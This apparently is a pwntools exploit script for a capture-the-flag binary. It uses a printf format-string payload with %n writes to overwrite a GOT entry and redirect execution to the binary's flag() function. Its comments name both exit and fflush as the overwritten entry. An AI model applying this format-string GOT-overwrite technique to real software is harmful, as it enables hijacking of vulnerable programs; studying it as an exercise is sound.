import struct
import pwn

# 32_new is a 32-bit dynamically-linked binary
# NX is enabled; ASLR is turned on

# We use a printf format string exploit to overwrite the got entry of exit with the address of the function flag()
# The process for enumerating the binary and assembling the payload is shown in enumeration.py


target = pwn.process('./32_new')
# pwn.gdb.attach(target, gdbscript="b *0x080487dc")

# fflush is called right after printf in the target program so we choose it to overwrite its GOT entry

# address of exit in got: objdump -R 32_new | grep exit
# 0x0804a034

# The address of the binary's flag() function (our target) is 0x0804870b

# We will overwrite the bytes of the fflush got entry sequentially
fflush_got_0 = struct.pack("<I", 0x0804a034)
fflush_got_1 = struct.pack("<I", 0x0804a034 + 1)
fflush_got_2 = struct.pack("<I", 0x0804a034 + 2)
fflush_got_3 = struct.pack("<I", 0x0804a034 + 3)

# see enumeration.py to see how the payload is assembled

payload5 = fflush_got_0 + fflush_got_1 + fflush_got_2 + fflush_got_3 + b'%181x' + b'%10$n' + b'%124x' + b'%11$n' + b'%125x' + b'%12$n' + b'%260x' + b'%13$n'

target.sendline(payload5)

target.recvuntil(b'flag')
print("flag" + target.recv(20).decode())